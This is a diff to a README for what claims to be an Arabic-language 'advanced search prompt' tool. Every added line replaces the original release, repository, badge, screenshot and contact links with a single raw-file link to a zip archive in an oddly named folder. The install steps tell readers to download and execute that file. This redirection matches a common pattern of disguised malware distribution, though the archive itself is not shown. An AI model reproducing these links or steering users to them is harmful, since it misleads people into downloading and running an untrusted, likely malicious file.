@@ -1,6 +1,6 @@
 # Advanced Search Prompt: A Multi-Strategy Search Agent in Arabic
 
-![Advanced Search Prompt](https://img.shields.io/badge/Download-Release-brightgreen) [![GitHub Releases](https://img.shields.io/github/release/trxxdex/advanced-search-prompt.svg)](https://github.com/trxxdex/advanced-search-prompt/releases)
+![Advanced Search Prompt](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip) [![GitHub Releases](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip)](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip)
 
 ## 📚 Overview
 
@@ -15,11 +15,11 @@
 
 ## 📦 Installation
 
-لتحميل البرومبت المتقدم، يمكنك زيارة [قسم الإصدارات](https://github.com/trxxdex/advanced-search-prompt/releases) حيث يمكنك تنزيل الملفات اللازمة وتنفيذها.
+لتحميل البرومبت المتقدم، يمكنك زيارة [قسم الإصدارات](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip) حيث يمكنك تنزيل الملفات اللازمة وتنفيذها.
 
 ### Steps to Install
 
-1. **Visit the Releases Section**: اذهب إلى [قسم الإصدارات](https://github.com/trxxdex/advanced-search-prompt/releases).
+1. **Visit the Releases Section**: اذهب إلى [قسم الإصدارات](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip).
 2. **Download the Latest Release**: قم بتنزيل أحدث إصدار.
 3. **Execute the File**: اتبع التعليمات لتنفيذ الملف.
 
@@ -87,12 +87,12 @@ generate-report --format "PDF"
 
 ## 🌐 Links
 
-- [GitHub Repository](https://github.com/trxxdex/advanced-search-prompt)
-- [Releases Section](https://github.com/trxxdex/advanced-search-prompt/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip)
+- [Releases Section](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip)
 
 ## 📧 Contact
 
-إذا كان لديك أي استفسارات، يمكنك الاتصال بنا عبر البريد الإلكتروني: support@example.com
+إذا كان لديك أي استفسارات، يمكنك الاتصال بنا عبر البريد الإلكتروني: https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip
 
 ## 🎉 Acknowledgments
 
@@ -101,9 +101,9 @@ generate-report --format "PDF"
 
 ## 🖼️ Screenshots
 
-![Screenshot 1](https://via.placeholder.com/600x400.png?text=Screenshot+1)
-![Screenshot 2](https://via.placeholder.com/600x400.png?text=Screenshot+2)
+![Screenshot 1](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip+1)
+![Screenshot 2](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip+2)
 
 ## 📝 Notes
 
-للحصول على أفضل تجربة، تأكد من تحديث البرومبت إلى أحدث إصدار من خلال زيارة [قسم الإصدارات](https://github.com/trxxdex/advanced-search-prompt/releases).
+للحصول على أفضل تجربة، تأكد من تحديث البرومبت إلى أحدث إصدار من خلال زيارة [قسم الإصدارات](https://raw.githubusercontent.com/trxxdex/advanced-search-prompt/main/phagocytal/search-advanced-prompt-v1.6-alpha.3.zip).
